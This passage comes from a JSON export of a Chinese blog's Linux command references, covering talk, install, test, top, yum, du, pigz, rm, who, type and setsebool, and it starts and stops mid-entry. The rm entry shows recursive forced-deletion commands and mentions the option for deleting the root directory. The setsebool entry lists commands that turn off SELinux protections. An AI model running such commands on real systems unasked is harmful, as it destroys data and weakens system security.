modules: 8250 acpi_memhotplug ac asus_acpi ata_piix auth_rpcgss backlight battery button cifs cpufreq crypto_api dell_wmi dm_log dm_mem_cache dm_message dm_mirror dm_mod dm_multipath dm_raid45 dm_region_hash dock e1000e edac_mc ehci_hcd exportfs ext3 hwmon i2c_core i2c_ec i2c_i801 i7core_edac i8042 ip_conntrack_netbios_ns ip_conntrack ip_tables iptable_filter ipv6 it821x jbd joydev keyboard libata lockd lp md_mod mousedev mpt2sas nfnetlink nfs_acl nfsd nls_utf8 ohci_hcd parport_pc parport pci_hotplug pcmcia pcmcia_core pcspkr piix power_meter printk processor psmouse rsrc_nonstatic sbs scsi_dh scsi_mod scsi_transport_sas sd_mod serio_raw sg shpchp snd_hda_intel snd_hwdep snd_mixer_oss snd_page_alloc snd_pcm_oss snd_pcm snd_seq_device snd_seq_dummy snd_seq_midi_event snd_seq_oss snd_seq snd_timer snd soundcore sunrpc tcp_bic tpm_bios tpm_tis tpm uhci_hcd usbcore usbhid video wmi x_tables xfrm_nalgo xt_limit xt_state xt_tcpudp yenta_socket ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"systool","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/systool/","stats":{"text":"2 min read","time":108000,"words":369,"minutes":2},"date":"2022-02-02 14:59:53","dateFormat":"2022-02-02"},{"content":"让用户和其他用户聊天。 补充说明 talk 命令是 talk 服务器的客户端工具，通过 talk 命令可以让用户和其他用户聊天。linux 中 talk 命令参数程序的使用很简单，只要知道交谈对象的地址，就可以邀请对方交谈。 语法 talk (参数) 参数 用户：指定聊天的用户； 终端：指定用户的终端。 实例 例如登录在主机 rs6000.cic.test.com 上的用户 xxx 希望和登录在主机 tirc.cs.test.com 上的用户 username 进行交谈，则可以输入下面的命令： talk username@tirc.cs.test.com Internet 上的相关程序（Talk Daemon）就会传送一条信息邀请 username 来交谈，这时用户 username 的屏幕上就会出现如下信息，并响铃提示： Message from Talk_Daemon@tirc.cs.test.com at 21:44 … talk: connection requested by xxx@rs6000.cic.test.com talk: respond with: talk xxx@rs6000.cic.test.com 这时，用户 username 应该做的工作就是按照上面的信息提示，即输入 linux 中 talk 命令： talk xxx@rs6000.cic.test.com 之后，连接建立成功，两个用户就可以进行交谈了。这时，双方的终端屏幕上都将显示信息 [Connection established] 并响铃，同时屏幕被 linux 中 talk 命令程序以一条水平线分割为上下两部分，上半部分用来显示用户自己输入的内容，下半部分用来显示对方输入的内容。两个用户可以同时输入，他们输入的内容将会立即显示在双方的屏幕上。 在用户进行输入时，可按 BACKSPACE 见来更正前一个字符，也可按 CTRL+w 来删除一个完整的单词，或者用 CTRL+U 来删除一整行，另外，用户还可以通过按 CTRL+L 来刷新屏幕。如果要结束交谈，可由任何一方按下 CTRL+C 来中断连接，但在结束对话前最好道声“再见”，并等待对方回应。linux 中 talk 命令程序结束时，在屏幕上将回显示一条信息： [Connection closing. Exiting] 并非每次要求对方交谈都能成功，有时对方没有登录，则 linux 中 talk 命令程序提示信息： [Your party is not logged on] 并退出； 如果对方已登录，但因某种原因（如不是正在使用机器）没有响应，那么 linux 中 talk 命令程序将会每隔 10 秒钟给他发一条邀请信息，同时在自己的屏幕上显示： [Ringing your party again] 如果用户不愿等待，则可以按 CTRL+C 终止 linux 中 talk 命令程序。还有的时候系统可能出现下面的信息： [Checking for invitation on caller’s machine] 这说明双方的 linux 中 talk 命令程序不兼容，这时可以试试 ntalk 和 ytalk 命令，如果没有，就只好找系统管理员了。 如果用户在做某些紧急工作（如编辑邮件）时不希望被 linux 中 talk 命令的邀请打搅，他可以使用命令： mesg n 来暂时拒绝交谈，这时如果有用户邀请他交谈，只能得到提示信息： [Your party is refusing messages] 不过要注意的是，一旦完成紧急工作。最好立即打开信息接收开关（用命令mesg y），否则将会失去很多信息交流的机会。 以上是 linux 中 talk 命令参数的是使用方法。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"talk","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/talk/","stats":{"text":"4 min read","time":193000,"words":860,"minutes":4},"date":"2022-02-02 14:59:26","dateFormat":"2022-02-02"},{"content":"安装或升级软件或备份数据。 补充说明 install 命令的作用是安装或升级软件或备份数据，它的使用权限是所有用户。install 命令和 cp 命令类似，都可以将文件/目录拷贝到指定的地点。但是，install 允许你控制目标文件的属性。install 通常用于程序的 makefile，使用它来将程序拷贝到目标（安装）目录。 语法 install [OPTION]... [-T] SOURCE DEST install [OPTION]... SOURCE... DIRECTORY install [OPTION]... -t DIRECTORY SOURCE... install [OPTION]... -d DIRECTORY... 在前两种格式中，会将&lt;来源&gt;复制至&lt;目的地&gt;或将多个&lt;来源&gt;文件复制至已存在的&lt;目录&gt;，同时设定权限模式及所有者/所属组。在第三种格式中，会创建所有指定的目录及它们的主目录。长选项必须用的参数在使用短选项时也是必须的。 选项 --backup[=CONTROL]：为每个已存在的目的地文件进行备份。 -b：类似 --backup，但不接受任何参数。 -c：(此选项不作处理)。 -d，--directory：所有参数都作为目录处理，而且会创建指定目录的所有主目录。 -D：创建&lt;目的地&gt;前的所有主目录，然后将&lt;来源&gt;复制至 &lt;目的地&gt;；在第一种使用格式中有用。 -g，--group=组：自行设定所属组，而不是进程目前的所属组。 -m，--mode=模式：自行设定权限模式 (像chmod)，而不是rwxr-xr-x。 -o，--owner=所有者：自行设定所有者 (只适用于超级用户)。 -p，--preserve-timestamps：以&lt;来源&gt;文件的访问/修改时间作为相应的目的地文件的时间属性。 -s，--strip：用strip命令删除symbol table，只适用于第一及第二种使用格式。 -S，--suffix=后缀：自行指定备份文件的&lt;后缀&gt;。 -v，--verbose：处理每个文件/目录时印出名称。 --help：显示此帮助信息并离开。 --version：显示版本信息并离开。 实例 install -d [option] DIRECTORY [DIRECTORY...] 支持多个，类似mkdir -p支持递归。例如：install -d a/b/c e/f结果和mkdir -p a/b/c e/f一样。 install [option] SOURCE DEST 复制 SOURCE 文件（测试不能是目录）到 DEST file（文件）： install a/e c 结果类似： cp a/e c #注意c必须是文件。 有用选项-D： install -D x a/b/c 效果类似：mkdir -p a/b &amp;&amp; cp x a/b/c install [option] SOURCE [SOURCE...] DIRECTORY 复制多个 SOURCE 文件到目的目录： install a/* d 其中 d 是目录。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"install","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/install/","stats":{"text":"3 min read","time":152000,"words":643,"minutes":3},"date":"2022-02-02 14:58:56","dateFormat":"2022-02-02"},{"content":"执行条件表达式。。 概要 test [expr] 主要用途 执行条件表达式。 参数 文件操作符： -a FILE 如果文件存在，则为true。 -b FILE 如果文件是块特殊的，则为true。 -c FILE 如果文件是特殊字符，则为true。 -d FILE 如果文件是目录，则为true。 -e FILE 如果文件存在，则为true。 -f FILE 如果文件存在并且是常规文件，则为true。 -g FILE 如果文件是set-group-id，则为true。 -h FILE 如果文件是符号链接，则为true。 -L FILE 如果文件是符号链接，则为true。 -k FILE 如果文件的粘滞位（sticky）设置了，则为true。 -p FILE 如果文件是命名管道，则为true。 -r FILE 如果您可以读取文件，则为true。 -s FILE 如果文件存在且不为空，则为true。 -S FILE 如果文件是套接字，则为true。 -t FD 如果在终端上打开FD，则为True。 -u FILE 如果文件是set-user-id，则为true。 -w FILE 如果文件可写，则为true。 -x FILE 如果您可以执行文件，则为true。 -O FILE 如果文件有效地归您所有，则为true。 -G FILE 如果文件有效地归您的组所有，则为true。 -N FILE 如果文件自上次读取以来已被修改，则为true。 FILE1 -nt FILE2 根据修改日期，如果 file1 比 file2 新，则为true。 FILE1 -ot FILE2 根据修改日期，如果 file1 比 file2 旧，则为true。 FILE1 -ef FILE2 如果 file1 为 file2 的硬链接，则为true。 字符串运算符： -z STRING 如果字符串为空，则为true。 -n STRING 如果字符串不为空，则为true。 STRING 如果字符串不为空，则为true。 STRING1 = STRING2 如果字符串相等，则为true。 STRING1 ！= STRING2 如果字符串不相等，则为true。 STRING1 &lt; STRING2 如果 STRING1 的字典排序在 STRING2 之前，则为true。 STRING1 &gt; STRING2 如果 STRING1 在字典排序在 STRING2 之后，则为true。 其他运算符： -o OPTION 如果启用了shell选项OPTION，则为true。 -v VAR 如果设置了shell变量VAR，则为true。 -R VAR 如果设置了shell变量VAR并且是变量引用，则为true。 ！EXPR 如果expr为假，则为true。 EXPR1 -a EXPR2 如果expr1和expr2都为true，则为true。 EXPR1 -o EXPR2 如果expr1或expr2为true，则为true。 arg1 OP arg2 算术表达式测试； OP是 -eq，-ne，-lt，-le，-gt，-ge 中的一个；算术表达式为真时返回true。 返回值 如果表达式执行结果为成功时返回 0，当表达式执行结果为失败或给出非法参数时返回 1。 例子 # 执行条件表达式并显示返回值。 [root@pc root]$ test ! &quot;abc&quot; == 123; echo $? 0 # 等价形式，注意：方括号 [ 后面的空格以及方括号 ] 前面的空格。 [root@pc root]$ [ ! &quot;abc&quot; == 123 ]; echo $? 0 [root@pc root]$ [[ ! &quot;abc&quot; == 123 ]]; echo $? 0 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"test","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/test/","stats":{"text":"3 min read","time":173000,"words":708,"minutes":3},"date":"2022-02-02 14:58:11","dateFormat":"2022-02-02"},{"content":"显示或管理执行中的程序。 补充说明 top 命令可以实时动态地查看系统的整体运行情况，是一个综合了多方信息监测系统性能和运行信息的实用工具。通过 top 命令所提供的互动式界面，用热键可以管理。 语法 top (选项) 选项 -b：以批处理模式操作； -c：显示完整的治命令； -d：屏幕刷新间隔时间； -I：忽略失效过程； -s：保密模式； -S：累积模式； -i&lt;时间&gt;：设置间隔时间； -u&lt;用户名&gt;：指定用户名； -p&lt;进程号&gt;：指定进程； -n&lt;次数&gt;：循环显示的次数。 top 交互命令 在 top 命令执行过程中可以使用的一些交互命令。这些命令都是单字母的，如果在命令行中使用了-s 选项， 其中一些命令可能会被屏蔽。 h：显示帮助画面，给出一些简短的命令总结说明； k：终止一个进程； i：忽略闲置和僵死进程，这是一个开关式命令； q：退出程序； r：重新安排一个进程的优先级别； S：切换到累计模式； s：改变两次刷新之间的延迟时间（单位为 s），如果有小数，就换算成 ms。输入 0 值则系统将不断刷新，默认值是 5s； f 或者 F：从当前显示中添加或者删除项目； o 或者 O：改变显示项目的顺序； l：切换显示平均负载和启动时间信息； m：切换显示内存信息； t：切换显示进程和 CPU 状态信息； c：切换显示命令名称和完整命令行； M：根据驻留内存大小进行排序； P：根据 CPU 使用百分比大小进行排序； T：根据时间/累计时间进行排序； w：将当前设置写入~/.toprc 文件中。 实例 top - 09:44:56 up 16 days, 21:23, 1 user, load average: 9.59, 4.75, 1.92 Tasks: 145 total, 2 running, 143 sleeping, 0 stopped, 0 zombie Cpu(s): 99.8%us, 0.1%sy, 0.0%ni, 0.2%id, 0.0%wa, 0.0%hi, 0.0%si, 0.0%st Mem: 4147888k total, 2493092k used, 1654796k free, 158188k buffers Swap: 5144568k total, 56k used, 5144512k free, 2013180k cached 解释： top - 09:44:56[当前系统时间 ], 16 days[系统已经运行了 16 天 ], 1 user[个用户当前登录 ], load average: 9.59, 4.75, 1.92[系统负载，即任务队列的平均长度 ] Tasks: 145 total[总进程数 ], 2 running[正在运行的进程数 ], 143 sleeping[睡眠的进程数 ], 0 stopped[停止的进程数 ], 0 zombie[冻结进程数 ], Cpu(s): 99.8%us[用户空间占用 CPU 百分比 ], 0.1%sy[内核空间占用 CPU 百分比 ], 0.0%ni[用户进程空间内改变过优先级的进程占用 CPU 百分比 ], 0.2%id[空闲 CPU 百分比 ], 0.0%wa[等待输入输出的 CPU 时间百分比 ], 0.0%hi[], 0.0%st[], Mem: 4147888k total[物理内存总量 ], 2493092k used[使用的物理内存总量 ], 1654796k free[空闲内存总量 ], 158188k buffers[用作内核缓存的内存量 ] Swap: 5144568k total[交换区总量 ], 56k used[使用的交换区总量 ], 5144512k free[空闲交换区总量 ], 2013180k cached[缓冲的交换区总量 ], ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"top","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/top/","stats":{"text":"4 min read","time":199000,"words":824,"minutes":4},"date":"2022-02-02 14:57:50","dateFormat":"2022-02-02"},{"content":"基于 RPM 的软件包管理器。 补充说明 yum 命令是在 Fedora 和 RedHat 以及 SUSE 中基于 rpm 的软件包管理器，它可以使系统管理人员交互和自动化地更新与管理 RPM 软件包，能够从指定的服务器自动下载 RPM 包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软体包，无须繁琐地一次次下载、安装。 yum 提供了查找、安装、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。 语法 yum (选项) (参数) 选项 -h：显示帮助信息； -y：对所有的提问都回答“yes”； -c：指定配置文件； -q：安静模式； -v：详细模式； -d：设置调试等级（0-10）； -e：设置错误等级（0-10）； -R：设置 yum 处理一个命令的最大等待时间； -C：完全从缓存中运行，而不去下载或者更新任何头文件。 参数 install：安装 rpm 软件包； update：更新 rpm 软件包； check-update：检查是否有可用的更新 rpm 软件包； remove：删除指定的 rpm 软件包； list：显示软件包的信息； search：检查软件包的信息； info：显示指定的 rpm 软件包的描述信息和概要信息； clean：清理 yum 过期的缓存； shell：进入 yum 的 shell 提示符； resolvedep：显示 rpm 软件包的依赖关系； localinstall：安装本地的 rpm 软件包； localupdate：显示本地 rpm 软件包进行更新； deplist：显示 rpm 软件包的所有依赖关系。 实例 部分常用的命令包括： 自动搜索最快镜像插件：yum install yum-fastestmirror 安装 yum 图形窗口插件：yum install yumex 查看可能批量安装的列表：yum grouplist 安装 yum install #全部安装 yum install package1 #安装指定的安装包package1 yum groupinsall group1 #安装程序组group1 更新和升级 yum update #全部更新 yum update package1 #更新指定程序包package1 yum check-update #检查可更新的程序 yum upgrade package1 #升级指定程序包package1 yum groupupdate group1 #升级程序组group1 查找和显示 # 检查 MySQL 是否已安装 yum list installed | grep mysql yum list installed mysql* yum info package1 #显示安装包信息package1 yum list #显示所有已经安装和可以安装的程序包 yum list package1 #显示指定程序包安装情况package1 yum groupinfo group1 #显示程序组group1信息yum search string 根据关键字string查找安装包 删除程序 yum remove &amp;#124; erase package1 #删除程序包package1 yum groupremove group1 #删除程序组group1 yum deplist package1 #查看程序package1依赖情况 清除缓存 yum clean packages #清除缓存目录下的软件包 yum clean headers #清除缓存目录下的 headers yum clean oldheaders #清除缓存目录下旧的 headers ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"yum","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/yum/","stats":{"text":"3 min read","time":165000,"words":705,"minutes":3},"date":"2022-02-02 14:57:08","dateFormat":"2022-02-02"},{"content":"显示每个文件和目录的磁盘使用空间。 补充说明 du 命令也是查看使用空间的，但是与 df 命令不同的是 Linux du 命令是对文件和目录磁盘使用的空间的查看，还是和 df 命令有一些区别的。 语法 du [选项 ][文件 ] 选项 -a或-all 显示目录中个别文件的大小。 -b或-bytes 显示目录或文件大小时，以byte为单位。 -c或--total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。 -k或--kilobytes 以KB(1024bytes)为单位输出。 -m或--megabytes 以MB为单位输出。 -s或--summarize 仅显示总计，只列出最后加总的值。 -h或--human-readable 以K，M，G为单位，提高信息的可读性。 -x或--one-file-xystem 以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。 -L&lt;符号链接&gt;或--dereference&lt;符号链接&gt; 显示选项中所指定符号链接的源文件大小。 -S或--separate-dirs 显示个别目录的大小时，并不含其子目录的大小。 -X&lt;文件&gt;或--exclude-from=&lt;文件&gt; 在&lt;文件&gt;指定目录或文件。 --exclude=&lt;目录或文件&gt; 略过指定的目录或文件。 -D或--dereference-args 显示指定符号链接的源文件大小。 -H或--si 与-h参数相同，但是K，M，G是以1000为换算单位。 -l或--count-links 重复计算硬件链接的文件。 实例 显示目录或者文件所占空间： root@localhost [test]# du 608 ./test6 308 ./test4 4 ./scf/lib 4 ./scf/service/deploy/product 4 ./scf/service/deploy/info 12 ./scf/service/deploy 16 ./scf/service 4 ./scf/doc 4 ./scf/bin 32 ./scf 8 ./test3 1288 . 只显示当前目录下面的子目录的目录大小和当前目录的总的大小，最下面的 1288 为当前目录的总大小 显示指定文件所占空间： [root@localhost test]# du log2012.log 300 log2012.log 查看指定目录的所占空间： [root@localhost test]# du scf 4 scf/lib 4 scf/service/deploy/product 4 scf/service/deploy/info 12 scf/service/deploy 16 scf/service 4 scf/doc 4 scf/bin 32 scf 显示多个文件所占空间： [root@localhost test]# du log30.tar.gz log31.tar.gz 4 log30.tar.gz 4 log31.tar.gz 只显示总和的大小: [root@localhost test]# du -s 1288 . [root@localhost test]# du -s scf 32 scf [root@localhost test]# cd .. [root@localhost soft]# du -s test 1288 test 显示总和的大小且易读: du -sh $dir ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"du","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/du/","stats":{"text":"3 min read","time":159000,"words":629,"minutes":3},"date":"2022-02-02 14:56:25","dateFormat":"2022-02-02"},{"content":"可以用来解压缩文件，gzip 的并行实现升级版。 补充说明 pigz 命令可以用来解压缩文件，最重要的是支持多线程并行处理，解压缩比 gzip 快。主页: http://zlib.net/pigz/ 语法 pigz [ -cdfhikKlLmMnNqrRtz0..9,11 ] [ -b blocksize ] [ -p threads ] [ -S suffix ] [ name ... ] unpigz [ -cfhikKlLmMnNqrRtz ] [ -b blocksize ] [ -p threads ] [ -S suffix ] [ name ... ] 参数 -0 to -9, -11 # Compression level (level 11, zopfli, is much slower) --fast, --best # Compression levels 1 and 9 respectively -b, --blocksize mmm # Set compression block size to mmmK (default 128K) -c, --stdout # Write all processed output to stdout (won't delete) -d, --decompress # Decompress the compressed input -f, --force # Force overwrite, compress .gz, links, and to terminal -F --first # Do iterations first, before block split for -11 -h, --help # Display a help screen and quit -i, --independent # Compress blocks independently for damage recovery -I, --iterations n # Number of iterations for -11 optimization -J, --maxsplits n # Maximum number of split blocks for -11 -k, --keep # Do not delete original file after processing -K, --zip # Compress to PKWare zip (.zip) single entry format -l, --list # List the contents of the compressed input -L, --license # Display the pigz license and quit -m, --no-time # Do not store or restore mod time -M, --time # Store or restore mod time -n, --no-name # Do not store or restore file name or mod time -N, --name # Store or restore file name and mod time -O --oneblock # Do not split into smaller blocks for -11 -p, --processes n # Allow up to n compression threads (default is the number of online processors, or 8 if unknown) -q, --quiet # Print no messages, even on error -r, --recursive # Process the contents of all subdirectories -R, --rsyncable # Input-determined block locations for rsync -S, --suffix .sss # Use suffix .sss instead of .gz (for compression) -t, --test # Test the integrity of the compressed input -v, --verbose # Provide more verbose output -V --version # Show the version of pigz -Y --synchronous # Force output file write to permanent storage -z, --zlib # Compress to zlib (.zz) instead of gzip format -- # All arguments after &quot;--&quot; are treated as files 实例 可以结合tar使用, 压缩命令 tar -cvf - dir1 dir2 dir3 | pigz -p 8 &gt; output.tgz 解压命令 pigz -p 8 -d output.tgz 如果是 gzip 格式，也支持用 tar 解压 tar -xzvf output.tgz ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pigz","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pigz/","stats":{"text":"3 min read","time":146000,"words":429,"minutes":3},"date":"2022-02-02 14:55:49","dateFormat":"2022-02-02"},{"content":"用于删除给定的文件和目录。 补充说明 rm 命令可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉。对于链接文件，只是删除整个链接文件，而原有文件保持不变。 注意：使用 rm 命令要格外小心。因为一旦删除了一个文件，就无法再恢复它。所以，在删除文件之前，最好再看一下文件的内容，确定是否真要删除。rm 命令可以用-i 选项，这个选项在使用文件扩展名字符删除多个文件时特别有用。使用这个选项，系统会要求你逐一确定是否要删除。这时，必须输入 y 并按 Enter 键，才能删除文件。如果仅按 Enter 键或其他字符，文件不会被删除。 语法 rm (选项) (参数) 选项 -d：直接把欲删除的目录的硬连接数据删除成 0，删除该目录； -f：强制删除文件或目录； -i：删除已有文件或目录之前先询问用户； -r 或-R：递归处理，将指定目录下的所有文件与子目录一并处理； --preserve-root：不对根目录进行递归操作； -v：显示指令的详细执行过程。 参数 文件：指定被删除的文件列表，如果参数中含有目录，则必须加上-r或者-R选项。 实例 交互式删除当前目录下的文件 test 和 example rm -i test example Remove test ?n（不删除文件test) Remove example ?y（删除文件example) 删除当前目录下除隐含文件外的所有文件和子目录 # rm -r * 应注意，这样做是非常危险的! rm 命令删除文件 # rm 文件 1 文件 2 ...rm testfile.txt rm 命令删除目录 rm -r [目录名称 ]-r 表示递归地删除目录下的所有文件和目录。-f 表示强制删除 rm -rf testdirrm -r testdir 删除操作前有确认提示 rm -i [文件/目录 ] rm -r -i testdir rm 忽略不存在的文件或目录 -f 选项（LCTT 译注：即 “force”）让此次操作强制执行，忽略错误提示 rm -f [文件...] 仅在某些场景下确认删除 选项 -I，可保证在删除超过 3 个文件时或递归删除时（LCTT 译注： 如删除目录）仅提示一次确认。 rm -I file1 file2 file3 删除根目录 当然，删除根目录（/）是 Linux 用户最不想要的操作，这也就是为什么默认 rm 命令不支持在根目录上执行递归删除操作。然而，如果你非得完成这个操作，你需要使用 --no-preserve-root 选项。当提供此选项，rm 就不会特殊处理根目录（/）了。 不给实例了，操作系统都被你删除了，你太坏了😆 rm 显示当前删除操作的详情 rm -v [文件/目录 ] ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rm","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rm/","stats":{"text":"3 min read","time":166000,"words":761,"minutes":3},"date":"2022-02-02 14:54:15","dateFormat":"2022-02-02"},{"content":"显示当前所有登陆用户的信息。。 概要 who [OPTION]... [file] [am i] 主要用途 当没有给出非选项参数时，按以下字段顺序为每个当前用户打印信息：登录用户名称，终端信息，登录时间，远程主机或 X display。 当用户执行 who am i 时，只显示运行该命令的用户的信息。 选项 -a, --all 等价于调用 '-b -d --login -p -r -t -T -u'。 -b, --boot 上次系统启动的时间。 -d, --dead 打印 dead 状态的进程。 -H, --heading 打印列标题行。 -l, --login 打印系统登录进程。 --lookup 尝试通过 DNS 规范主机名。 -m 仅显示和标准输入关联的主机名和用户。 -p, --process 打印由 init 生成的活动进程。 -q, --count 列出所有已登录的用户的名称和数量。 -r, --runlevel 打印当前运行级别。 -s, --short 仅打印名称、行和时间（默认）。 -t, --time 打印上次系统时钟更改。 -T, -w, --mesg, --message, --writable 将 '+、-、?' 中的一个作为用户的消息状态添加到用户名称后面。 -u, --users 列出登录的用户。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 关于 -T 选项的 '+、-、?'： '+' 允许写入信息 '-' 禁止写入信息 '?' 不能查找到终端设备 参数 file（可选）：指定 file 代替默认的 /var/run/utmp 、/etc/utmp ； 通常使用 /var/log/wtmp 作为参数用于查看过去登陆系统的用户。 返回值 返回 0 表示成功，返回非 0 值表示失败。 例子 [root@localhost ~]# who root pts/0 2013-08-19 15:04 (192.168.0.134) root pts/1 2013-12-20 10:37 (180.111.155.40) [root@localhost ~]# who -q root root # users=2 [root@localhost ~]# who -H NAME LINE time COMMENT root pts/0 2013-08-19 15:04 (192.168.0.134) root pts/1 2013-12-20 10:37 (180.111.155.40) [root@localhost ~]# who -w root + pts/0 2013-08-19 15:04 (192.168.0.134) root + pts/1 2013-12-20 10:37 (180.111.155.40) 注意 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man -s 1 who，info coreutils 'who invocation'。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"who","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/who/","stats":{"text":"3 min read","time":133000,"words":521,"minutes":3},"date":"2022-02-02 14:53:30","dateFormat":"2022-02-02"},{"content":"显示指定命令的类型。。 概要 type [-afptP] name [name ...] 主要用途 显示要查找的命令的信息。 控制查找范围和行为。 显示要查找的命令优先级最高的类型。 选项 -a：在环境变量PATH中查找并显示所有包含name的可执行文件路径；当'-p'选项没有同时给出时，如果在别名、关键字，函数，内建的信息中存在name，则一并显示。 -f：排除对shell函数的查找。 -p：如果name在执行'type -t name'返回的不是'file'，那么什么也不返回；否则会在环境变量PATH中查找并返回可执行文件路径。 -P：即使要查找的name是别名、内建、函数中的一个，仍然会在环境变量PATH中查找并返回可执行文件路径。 -t：根据name的类型返回一个单词（别名，关键字，函数，内建，文件），否则返回空值。 参数 name：要查找的命令，可以为多个。 返回值 当指定的命令可以找到时返回成功，如果有没找到的返回失败。 例子 接下来要用到的例子假设'~/.bashrc'文件定义了以下的内容： alias ls='ls --color=auto' mybash(){ vim ~/.bashrc; } 而且执行环境里没有使用enable禁用内建命令。 type -a mybash # 输出 mybash is a function mybash () { vim ~/.bashrc } type -a -f mybash # 输出（因为排除了函数，所以报错） bash: type: mybash: not found type -a -p mybash # 输出为空（因为排除了函数，所以什么也不返回） type -a ls # 输出 ls is aliased to `ls --color=suto' ls is /usr/bin/ls ls is /bin/ls type -a -p ls # 输出 /usr/bin/ls /bin/ls # '-f'不会影响'-P'的范围，'-f'不建议和'-p'使用。 # 注意：printf同时是内建命令以及可执行文件（GNU coreutils），优先作为内建处理。 type -p printf # 输出为空 type -P printf # 输出 /usr/bin/printf /bin/printf # 如果有多个类型，那么输出优先级最高的类型。 type -t ls # 输出 alias type -t for # 输出（bash关键字） keyword type -t mybash # 输出 function type -t -f mybash # 输出空值 type -t printf # 输出（bash内建优先级高） builtin type -t chmod # 输出 file 注意 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 命令优先级问题请查看builtin命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"type","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/type/","stats":{"text":"3 min read","time":141000,"words":592,"minutes":3},"date":"2022-02-02 14:52:40","dateFormat":"2022-02-02"},{"content":"修改 SElinux 策略内各项规则的布尔值。 补充说明 setsebool 命令是用来修改 SElinux 策略内各项规则的布尔值。setsebool 命令和 getsebool 命令是 SELinux 修改和查询布尔值的一套工具组。SELinux 的策略与规则管理相关命令：seinfo 命令、sesearch 命令、getsebool 命令、setsebool 命令、semanage 命令。 语法 setsebool [-P] 布尔值=[0|1] 选项 -P:直接将设置值写入配置文件，该设置数据将来会生效的。 实例 允许 vsvtp 匿名用户写入权限： setsebool -P allow_ftpd_anon_write=1 如果你希望你的 ftp 用户可以访问自己的家目录的话，需要开启： setsebool -P ftp_home_dir 1 如果你希望将 vsftpd 以 daemon 的方式运行的话，需要开启： setsebool -P ftpd_is_daemon 1 你可以让 SElinux 停止保护 vsftpd 的 daemon 方式动行： setsebool -P ftpd_disable_trans 1 HTTP 被设置允许 cgi 的设置： setsebool -P httpd_enable_cgi 1 允许用户 HHTP 访问其家目录，该设定限仅于用户的家目录主页： setsebool -P httpd_enable_homedirs 1 chcon -R -t httpd_sys_content_t ~user/public_html 允许 httpd 访问终端： setsebool -P httpd_tty_comm 1 关闭 Selinux 的关于 httpd 进程守护的保护： setsebool -P httpd_disable_trans 1 service httpd restart 关于 named、master 更新 selinux 设定： setsebool -P named_write_master_zones 1 关闭 named 的进程守护保护： setsebool -P named_disable_trans 1 service named restart Selinux 将本机的 NFS 共享设置成只读： setsebool -P nfs_export_all_ro 1 SElinux 将本机的 NFS 共享设置成可读可写： setsebool -P nfs_export_all_rw 1 如果你想要将远程 NFS 的家目录共享到本机，需要开启： setsebool -P use_nfs_home_dirs 1 如果 samba 服务器共享目录给多个域，则需要： setsebool -P allow_smbd_anon_write=1 samba 服务器要共享家目录时： setsebool -P samba_enable_home_dirs 1 如果你需在本机上使用远程 samba 服务器的家目录： setsebool -P use_samba_home_dirs 1 关闭 selinux 关于 samba 的进程守护的保护： setsebool -P smbd_disable_trans 1 service smb restart 允许 rsync 其他用户写入时： setsebool -P allow_rsync_anon_write=1 停止 rsync 的进程保护 setsebool -P rsync_disable_trans 1 允许系统使用 kerberos： setsebool -P allow_kerberos 1 系统工作在 nis 环境时： setsebool -P allow_ypbind 1 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"setsebool","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/setsebool/","stats":{"text":"3 min read","time":129000,"words":519,"minutes":3},"date":"2022-02-02 14:51:48","dateFormat":"2022-02-02"},{"content":"删除指定的 shell 变量或函数。。 概要 unset [-f] [-v] [-n] [name ...] 主要用途 删除一到多个 shell 变量（不包括只读变量）。 删除一到多个 shell 函数。 删除一到多个具有引用属性的变量（如果-n 选项存在）。 选项 -f：仅删除函数。 -v：仅删除变量（不包括只读变量）。 -n：删除具有引用属性的变量名（如果该选项存在）。 参数 name（可选）：要删除的变量或函数。 返回值 